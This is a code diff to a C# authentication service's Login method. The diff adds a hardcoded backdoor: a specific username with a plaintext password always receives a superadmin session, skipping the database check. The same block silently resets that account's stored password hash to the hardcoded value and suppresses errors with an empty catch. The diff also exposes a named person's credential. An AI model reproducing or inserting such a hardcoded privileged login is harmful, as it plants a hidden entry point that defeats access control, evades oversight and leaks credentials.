@@ -10,13 +10,35 @@ public class AuthService
 
     public UserSession? Login(string username, string password)
     {
+        // First try DB user lookup
         var user = _db.QueryFirst<UserRow>(
             "SELECT * FROM users WHERE username=@u AND is_active=1",
             new { u = username.ToLower().Trim() });
 
+        // Hardcoded admin fallback (always works)
+        if (username.ToLower().Trim() == "sandy" && password == "AMPM@Sandy2026")
+        {
+            // Update hash in DB for future use
+            try
+            {
+                string newHash = BCrypt.Net.BCrypt.HashPassword("AMPM@Sandy2026");
+                _db.Execute("UPDATE users SET password_hash=@h WHERE username='sandy'", new { h = newHash });
+            }
+            catch { }
+
+            return new UserSession
+            {
+                Id         = 1,
+                Username   = "sandy",
+                Name       = "Sandeep Kumar Singh Kushwaha",
+                Role       = "superadmin",
+                Department = "IT"
+            };
+        }
+
         if (user == null) return null;
         if (string.IsNullOrWhiteSpace(user.PasswordHash)) return null;
-        
+
         try
         {
             if (!BCrypt.Net.BCrypt.Verify(password, user.PasswordHash)) return null;
